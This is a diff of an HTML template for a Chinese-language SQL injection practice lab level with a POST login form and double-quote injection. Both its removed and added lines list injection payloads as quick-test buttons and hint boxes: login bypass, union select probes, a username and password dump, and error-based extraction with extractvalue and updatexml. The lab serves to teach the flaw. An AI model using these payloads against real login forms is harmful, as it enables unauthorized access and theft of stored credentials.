@@ -19,23 +19,32 @@
                     <div class="login-form-section">
                         <h5>用户登录</h5>
                         <form method="POST" class="mb-4">
-                            <div class="form-group">
-                                <label for="uname">用户名：</label>
-                                <input type="text" class="form-control" name="uname" id="uname" 
-                                       value="{{ uname }}" placeholder="输入用户名">
+                            <div class="input-group mb-3">
+                                <span class="input-group-text">
+                                    <i class="fas fa-user"></i>
+                                </span>
+                                <input type="text" name="uname" class="form-control" 
+                                       placeholder="用户名" value="{{ request.form.get('uname', '') }}">
                             </div>
-                            <div class="form-group">
-                                <label for="passwd">密码：</label>
-                                <input type="password" class="form-control" name="passwd" id="passwd" 
-                                       value="{{ passwd }}" placeholder="输入密码">
+                            <div class="input-group mb-3">
+                                <span class="input-group-text">
+                                    <i class="fas fa-lock"></i>
+                                </span>
+                                <input type="password" name="passwd" class="form-control" 
+                                       placeholder="密码" value="{{ request.form.get('passwd', '') }}">
                             </div>
-                            <button type="submit" class="btn btn-primary">
-                                <i class="fas fa-sign-in-alt"></i> 登录
-                            </button>
+                            <div class="row">
+                                <div class="col-6">
+                                    <input type="submit" value="登录" class="btn btn-primary btn-lg w-100" style="border: none;">
+                                </div>
+                                <div class="col-6">
+                                    <input type="button" value="重置" class="btn btn-secondary btn-lg w-100" onclick="clearForm12();" style="border: none;">
+                                </div>
+                            </div>
                         </form>
                     </div>
 
-                    {% if uname or passwd %}
+                    {% if request.method == 'POST' %}
                     <div class="result-section">
                         <h5>测试结果：</h5>
                         {% if error_msg %}
@@ -60,9 +69,13 @@
                         </div>
                         {% endif %}
                         
-                        {% if message %}
+                        {% if login_success %}
+                        <div class="alert alert-success">
+                            <strong>✅ 登录成功！</strong>
+                        </div>
+                        {% elif not result and not error_msg %}
                         <div class="alert alert-warning">
-                            {{ message }}
+                            <strong>❌ 登录失败！</strong> 用户名或密码错误
                         </div>
                         {% endif %}
                     </div>
@@ -71,19 +84,19 @@
                     <div class="quick-tests mt-4">
                         <h5>快速测试载荷：</h5>
                         <div class="payload-buttons">
-                            <button class="btn btn-outline-primary btn-sm" onclick="setPayload('admin', 'admin123')">
+                            <button class="btn btn-outline-primary btn-sm" onclick="quickTest12('admin', 'admin123')">
                                 正常登录: admin/admin123
                             </button>
-                            <button class="btn btn-outline-warning btn-sm" onclick="setPayload('admin\"', 'password')">
+                            <button class="btn btn-outline-warning btn-sm" onclick="quickTest12('admin\\\"', 'password')">
                                 语法错误: admin"
                             </button>
-                            <button class="btn btn-outline-success btn-sm" onclick="setPayload('admin\" or \"1\"=\"1', 'anything')">
+                            <button class="btn btn-outline-success btn-sm" onclick="quickTest12('admin\\\" or \\\"1\\\"=\\\"1', 'anything')">
                                 绕过登录: admin" or "1"="1
                             </button>
-                            <button class="btn btn-outline-info btn-sm" onclick="setPayload('admin\" union select 1,2,3,4,5--+', 'anything')">
+                            <button class="btn btn-outline-info btn-sm" onclick="quickTest12('admin\\\" union select 1,2,3,4,5--+', 'anything')">
                                 联合查询: admin" union select 1,2,3,4,5--+
                             </button>
-                            <button class="btn btn-outline-danger btn-sm" onclick="setPayload('admin\" and extractvalue(1,concat(0x7e,database(),0x7e))--+', 'anything')">
+                            <button class="btn btn-outline-danger btn-sm" onclick="quickTest12('admin\\\" and extractvalue(1,concat(0x7e,database(),0x7e))--+', 'anything')">
                                 报错注入: extractvalue函数
                             </button>
                         </div>
@@ -93,91 +106,68 @@
         </div>
 
         <div class="col-lg-4">
-            <div class="card info-card">
-                <div class="card-header">
-                    <h5><i class="fas fa-lightbulb"></i> 漏洞分析</h5>
+            <div class="card">
+                <div class="card-header bg-success text-white">
+                    <h5>
+                        <i class="fas fa-lightbulb me-2"></i>
+                        注入提示
+                    </h5>
                 </div>
                 <div class="card-body">
-                    <h6>漏洞类型：</h6>
-                    <p>POST双引号字符串注入</p>
+                    <h6><i class="fas fa-bug me-2 text-danger"></i>漏洞分析</h6>
+                    <p class="small">此关卡存在POST双引号字符串注入漏洞，通过表单提交的参数进行SQL注入攻击。</p>
                     
-                    <h6>特点：</h6>
-                    <ul>
-                        <li>POST方法提交</li>
-                        <li>双引号闭合</li>
-                        <li>表单参数注入</li>
-                        <li>错误信息显示</li>
+                    <h6><i class="fas fa-tools me-2 text-primary"></i>测试步骤</h6>
+                    <ol class="small">
+                        <li>尝试正常登录测试</li>
+                        <li>输入双引号触发语法错误</li>
+                        <li>构造绕过登录的载荷</li>
+                        <li>使用联合查询获取数据</li>
+                    </ol>
+
+                    <h6><i class="fas fa-code me-2 text-info"></i>示例Payload</h6>
+                    <div class="bg-dark text-light p-2 rounded small mb-2">
+                        <code>admin" or "1"="1</code>
+                    </div>
+                    <div class="bg-dark text-light p-2 rounded small mb-2">
+                        <code>admin" union select 1,2,3,4,5--</code>
+                    </div>
+                    <div class="bg-dark text-light p-2 rounded small">
+                        <code>admin" and extractvalue(1,concat(0x7e,database(),0x7e))--</code>
+                    </div>
+
+                    <h6 class="mt-3"><i class="fas fa-paper-plane me-2 text-warning"></i>POST注入特点</h6>
+                    <ul class="small mb-0">
+                        <li>通过表单提交参数</li>
+                        <li>参数在请求体中</li>
+                        <li>需使用工具进行测试</li>
+                        <li>相对GET方式更隐蔽</li>
                     </ul>
-
-                    <h6>SQL查询结构：</h6>
-                    <code>SELECT * FROM users WHERE username="用户输入" AND password="用户输入"</code>
                 </div>
             </div>
 
-            <div class="card payload-card mt-3">
-                <div class="card-header">
-                    <h5><i class="fas fa-code"></i> POST载荷示例</h5>
+            <div class="card mt-3">
+                <div class="card-header bg-warning text-dark">
+                    <h6>
+                        <i class="fas fa-exclamation-triangle me-2"></i>
+                        快速测试
+                    </h6>
                 </div>
                 <div class="card-body">
-                    <h6>绕过登录：</h6>
-                    <code>admin" or "1"="1</code><br>
-                    <code>admin" or "1"="1"--+</code><br><br>
-                    
-                    <h6>联合查询：</h6>
-                    <code>admin" union select 1,2,3,4,5--+</code><br>
-                    <code>" union select 1,username,password,4,5 from users--+</code><br><br>
-                    
-                    <h6>报错注入：</h6>
-                    <code>admin" and extractvalue(1,concat(0x7e,database(),0x7e))--+</code><br>
-                    <code>admin" and updatexml(1,concat(0x7e,version(),0x7e),1)--+</code>
-                </div>
-            </div>
-
-            <div class="card method-card mt-3">
-                <div class="card-header">
-                    <h5><i class="fas fa-exchange-alt"></i> GET vs POST</h5>
-                </div>
-                <div class="card-body">
-                    <table class="table table-sm">
-                        <thead>
-                            <tr>
-                                <th>方面</th>
-                                <th>GET</th>
-                                <th>POST</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td>参数位置</td>
-                                <td>URL中</td>
-                                <td>请求体中</td>
-                            </tr>
-                            <tr>
-                                <td>可见性</td>
-                                <td>明文可见</td>
-                                <td>相对隐蔽</td>
-                            </tr>
-                            <tr>
-                                <td>测试工具</td>
-                                <td>浏览器直接</td>
-                                <td>需要工具</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-
-            <div class="card tips-card mt-3">
-                <div class="card-header">
-                    <h5><i class="fas fa-tools"></i> 测试工具</h5>
-                </div>
-                <div class="card-body">
-                    <ul>
-                        <li><strong>Burp Suite:</strong> 拦截修改POST请求</li>
-                        <li><strong>OWASP ZAP:</strong> 自动化扫描</li>
-                        <li><strong>SQLMap:</strong> 自动化注入</li>
-                        <li><strong>浏览器开发者工具:</strong> 修改表单</li>
-                    </ul>
+                    <div class="d-grid gap-2">
+                        <button type="button" class="btn btn-outline-primary btn-sm" onclick="quickTest12('admin', 'admin123')">
+                            正常登录
+                        </button>
+                        <button type="button" class="btn btn-outline-danger btn-sm" onclick="quickTest12('admin\\\"', 'password')">
+                            语法错误
+                        </button>
+                        <button type="button" class="btn btn-outline-success btn-sm" onclick="quickTest12('admin\\\" or \\\"1\\\"=\\\"1', 'anything')">
+                            绕过登录
+                        </button>
+                        <button type="button" class="btn btn-outline-info btn-sm" onclick="quickTest12('admin\\\" union select 1,2,3,4,5--+', 'anything')">
+                            联合查询
+                        </button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -185,9 +175,29 @@
 </div>
 
 <script>
-function setPayload(username, password) {
-    document.getElementById('uname').value = username;
-    document.getElementById('passwd').value = password;
+function quickTest12(username, password) {
+    $('input[name="uname"]').val(username);
+    $('input[name="passwd"]').val(password);
+    $('form').submit();
 }
+
+function clearForm12() {
+    $('input[name="uname"]').val('');
+    $('input[name="passwd"]').val('');
+}
+
+$(document).ready(function() {
+    // 显示密码功能
+    $('.input-group').on('click', '.fa-lock', function() {
+        var input = $(this).closest('.input-group').find('input');
+        if (input.attr('type') === 'password') {
+            input.attr('type', 'text');
+            $(this).removeClass('fa-lock').addClass('fa-unlock');
+        } else {
+            input.attr('type', 'password');
+            $(this).removeClass('fa-unlock').addClass('fa-lock');
+        }
+    });
+});
 </script>
 {% endblock %} 
